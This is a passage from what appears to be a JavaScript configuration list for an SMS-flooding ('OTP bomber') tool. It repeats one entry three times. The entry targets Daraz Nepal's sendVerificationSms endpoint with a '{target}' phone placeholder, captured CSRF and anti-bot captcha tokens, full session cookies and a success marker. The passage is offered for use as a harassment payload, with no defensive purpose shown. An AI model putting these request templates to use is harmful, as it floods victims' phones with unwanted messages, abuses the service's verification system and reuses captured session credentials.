cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
];
